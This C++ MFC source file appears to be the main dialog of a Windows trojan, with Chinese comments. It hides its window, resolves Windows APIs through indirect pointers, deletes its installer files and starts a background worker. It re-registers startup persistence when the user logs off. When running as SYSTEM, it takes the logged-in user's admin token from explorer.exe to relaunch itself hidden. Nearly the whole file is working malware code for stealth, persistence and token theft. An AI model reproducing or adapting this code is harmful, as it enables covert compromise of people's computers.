// PttAppDlg.cpp : implementation file
//

#include "stdafx.h"
#include "PttApp.h"
#include "PttAppDlg.h"
#include "WinApi.h"
#include "Base.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

//////////////////////////////////////////////////////////////////////////

#define TokenLinkedToken 19

typedef struct _TOKEN_LINKED_TOKEN {
    HANDLE LinkedToken;
} TOKEN_LINKED_TOKEN, *PTOKEN_LINKED_TOKEN;

DWORD GetActiveSessionID();
bool IsSystemPrivilegeImp();
BOOL TriggerAppExecute(std::wstring wstrCmdLine/*, INT32& n32ExitResult*/);

/////////////////////////////////////////////////////////////////////////////
// CPttAppDlg dialog

CPttAppDlg::CPttAppDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CPttAppDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CPttAppDlg)
		// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT
	// Note that LoadIcon does not require a subsequent DestroyIcon in Win32
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CPttAppDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CPttAppDlg)
		// NOTE: the ClassWizard will add DDX and DDV calls here
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CPttAppDlg, CDialog)
	//{{AFX_MSG_MAP(CPttAppDlg)
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_WM_QUERYENDSESSION()
	ON_WM_ENDSESSION()
	ON_BN_CLICKED(IDC_BUTTON1, OnButton1)
	ON_BN_CLICKED(IDC_BUTTON2, OnButton2)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CPttAppDlg message handlers

BOOL CPttAppDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon
	
	// TODO: Add extra initialization here
	ModifyStyleEx(WS_EX_APPWINDOW,WS_EX_TOOLWINDOW);
	
	MoveWindow(0,0,0,0);

	//DelRunF();

	return TRUE;  // return TRUE  unless you set the focus to a control
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.

void CPttAppDlg::OnPaint() 
{
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting

		SendMessage(WM_ICONERASEBKGND, (WPARAM) dc.GetSafeHdc(), 0);

		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

// The system calls this to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CPttAppDlg::OnQueryDragIcon()
{
	return (HCURSOR) m_hIcon;
}

//////////////////////////////////////////////////////////////////////////

BOOL g_bWork = TRUE;

#include "GetInputInfo.h"

LRESULT CPttAppDlg::DefWindowProc(UINT message, WPARAM wParam, LPARAM lParam) 
{
	// TODO: Add your specialized code here and/or call the base class

	if (message == WM_NCCREATE)
	{
		GetNTProcesspFun();	

		WCHAR ExePathName[MAX_PATH];
		
		//		OutputDebugStringA("check");
		if(IsSystemPrivilegeImp())
		{
			//			OutputDebugStringA("system");
			PGetModuleFileNameW(NULL, ExePathName, MAX_PATH);
			TriggerAppExecute(ExePathName);
			exit(0);
		}
		
		WCHAR ExePath[MAX_PATH], ExeName[MAX_PATH], SelfPath[MAX_PATH];
		myGetModuleFile(ExePath, MAX_PATH, ExeName, MAX_PATH);
		
		wcscpy(SelfPath, ExePath);
		wcscpy(SelfPath, L"install.ini");
		BootNTRemoveW(SelfPath);
		
		wcscpy(SelfPath, ExePath);
		wcscpy(SelfPath, L"upgrade.hzt");
		BootNTRemoveW(SelfPath);

		LPWSTR lpCmdLine = AfxGetApp()->m_lpCmdLine;

		if (wcslen(lpCmdLine) == 0)
		{
			DestroyTro();
		}
		
		try
		{
			if(g_bWork)
			{
				g_bWork = FALSE;
				throw 2016;
			}
		}
		catch (...)
		{
			Base work;
			work.ThreadWorkStart();
		}
	}
	
	return CDialog::DefWindowProc(message, wParam, lParam);
}

BOOL CPttAppDlg::OnQueryEndSession() 
{
	// 	if (!CDialog::OnQueryEndSession())
	// 		return FALSE;
	
	try
	{
		int a = PGetTickCount();
		if(a > 5000)
			throw 87;
	}
	catch (...)
	{
		AddRun();
	}
	
	return TRUE;
}

void CPttAppDlg::OnEndSession(BOOL bEnding) 
{
	//CDialog::OnEndSession(bEnding);
	if (bEnding == FALSE)
	{
		return ;
	}
	
	try
	{
		int a = PGetTickCount();
		if(a > 5000)
			throw 87;
	}
	catch (...)
	{
		AddRun();
	}
}

//////////////////////////////////////////////////////////////////////////

bool RunShadow()
{
	char filepath[MAX_PATH];
	PGetModuleFileNameA(NULL, filepath, MAX_PATH);
	PShellExecuteA(NULL, "open", filepath, "shadow", NULL, SW_SHOWNORMAL);

	return true;
}

//////////////////////////////////////////////////////////////////////////

DWORD GetActiveSessionID()
{

    DWORD dwSessionId = 0;
    PWTS_SESSION_INFOA pSessionInfo = NULL;
    DWORD dwCount = 0;

    PWTSEnumerateSessionsA(WTS_CURRENT_SERVER_HANDLE, 0, 1, &pSessionInfo, &dwCount);

    for(DWORD i = 0; i < dwCount; i++)
    {
        WTS_SESSION_INFOA si = pSessionInfo[i];
        if(WTSActive == si.State)
        {
            dwSessionId = si.SessionId;
            break;
        }
    }

    PWTSFreeMemory(pSessionInfo);
    return dwSessionId;

}

bool IsSystemPrivilegeImp()
{
    static bool isSystemPrivilege = false;
    if (isSystemPrivilege)
    {
        return isSystemPrivilege;
    }
	
    char szPath[MAX_PATH] = {0};
    if (PSHGetSpecialFolderPathA(NULL, szPath, CSIDL_APPDATA, TRUE))
    {
        std::string flag("config\\systemprofile");
        std::string path(szPath);
        if (path.find(flag) != std::string::npos)
        {
            isSystemPrivilege = true;
        }
    }
	
    return isSystemPrivilege;
}

BOOL TriggerAppExecute(std::wstring wstrCmdLine/*, INT32& n32ExitResult*/)
{
//	OutputDebugStringW(wstrCmdLine.c_str());

    DWORD dwProcesses = 0;
    BOOL bResult = FALSE;

    DWORD dwSid = GetActiveSessionID();

    DWORD dwRet = 0;
    PROCESS_INFORMATION pi;
    STARTUPINFOW si;
    HANDLE hProcess = NULL, hPToken = NULL, hUserTokenDup = NULL;
    if (!PWTSQueryUserToken(dwSid, &hPToken))
    {
        PROCESSENTRY32W procEntry;
        DWORD dwPid = 0;
        HANDLE hSnap = PCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnap == INVALID_HANDLE_VALUE)
        {
            return FALSE;
        }

        procEntry.dwSize = sizeof(PROCESSENTRY32W);
        if (PProcess32FirstW(hSnap, &procEntry))
        {
            do
            {
                if (wcsicmp(procEntry.szExeFile, L"explorer.exe") == 0)
                {
                    DWORD exeSessionId = 0;
                    if (PProcessIdToSessionId(procEntry.th32ProcessID, &exeSessionId) && exeSessionId == dwSid)
                    {
                        dwPid = procEntry.th32ProcessID;
                        break;
                    }
                }

            } while (PProcess32NextW(hSnap, &procEntry));
        }
        CloseHandle(hSnap);

        // explorer进程不存在
        if (dwPid == 0)
        {
            return FALSE;
        }

        hProcess = POpenProcess(PROCESS_QUERY_INFORMATION, FALSE, dwPid);
        if (hProcess == NULL)
        {
            return FALSE;
        }

        if(!POpenProcessToken(hProcess, TOKEN_ALL_ACCESS_P,&hPToken))
        {
            CloseHandle(hProcess);
            return FALSE;
        }
    }

    if (hPToken == NULL)
        return FALSE;


//	OutputDebugStringA("get token info");
    TOKEN_LINKED_TOKEN admin;
    bResult = PGetTokenInformation(hPToken, (TOKEN_INFORMATION_CLASS)TokenLinkedToken, &admin, sizeof(TOKEN_LINKED_TOKEN), &dwRet);

    if (!bResult) // vista 以前版本不支持TokenLinkedToken
    {
        TOKEN_PRIVILEGES tp;
        LUID luid;
        if (PLookupPrivilegeValueA(NULL, "SeDebugPrivilege", &luid))
        {
            tp.PrivilegeCount =1;
            tp.Privileges[0].Luid =luid;
            tp.Privileges[0].Attributes =SE_PRIVILEGE_ENABLED;
        }
        //复制token
		PDuplicateTokenEx(hPToken,MAXIMUM_ALLOWED,NULL,SecurityIdentification,TokenPrimary,&hUserTokenDup);
    }
    else
    {
        hUserTokenDup = admin.LinkedToken;
    }

    LPVOID pEnv =NULL;
    DWORD dwCreationFlags = CREATE_PRESERVE_CODE_AUTHZ_LEVEL;

//	OutputDebugStringA("get environ");
    // hUserTokenDup为当前登陆用户的令牌
    if(PCreateEnvironmentBlock(&pEnv,hUserTokenDup,TRUE))
    {
        //如果传递了环境变量参数，CreateProcessAsUser的
        //dwCreationFlags参数需要加上CREATE_UNICODE_ENVIRONMENT，
        //这是MSDN明确说明的
        dwCreationFlags|=CREATE_UNICODE_ENVIRONMENT;
    }
    else
    {
        //环境变量创建失败仍然可以创建进程，
        //但会影响到后面的进程获取环境变量内容
        pEnv = NULL;
    }

    ZeroMemory( &si, sizeof(si) );
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    ZeroMemory( &pi, sizeof(pi) );

//	OutputDebugStringA("create process as user");
    bResult = PCreateProcessAsUserW(
        hUserTokenDup,                     // client's access token
        NULL,    // file to execute
        (unsigned short*)wstrCmdLine.c_str(),                 // command line
        NULL,            // pointer to process SECURITY_ATTRIBUTES
        NULL,               // pointer to thread SECURITY_ATTRIBUTES
        FALSE,              // handles are not inheritable
        dwCreationFlags,     // creation flags
        pEnv,               // pointer to new environment block
        NULL,               // name of current directory
        &si,               // pointer to STARTUPINFO structure
        &pi                // receives information about new process
        );  


    if(pi.hProcess)
    {
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }

    if (hUserTokenDup != NULL)
        CloseHandle(hUserTokenDup);
    if (hProcess != NULL)
        CloseHandle(hProcess);
    if (hPToken != NULL)
        CloseHandle(hPToken);
    if (pEnv != NULL)
        PDestroyEnvironmentBlock(pEnv);

    return TRUE;
}


void CPttAppDlg::OnButton1() 
{
	// TODO: Add your control notification handler code here
	
}

void CPttAppDlg::OnButton2() 
{
	// TODO: Add your control notification handler code here
	
}

void CPttAppDlg::OnOK() 
{
	// TODO: Add extra validation here
	
	CDialog::OnOK();
}

void CPttAppDlg::OnCancel() 
{
	// TODO: Add extra cleanup here
	
	CDialog::OnCancel();
}
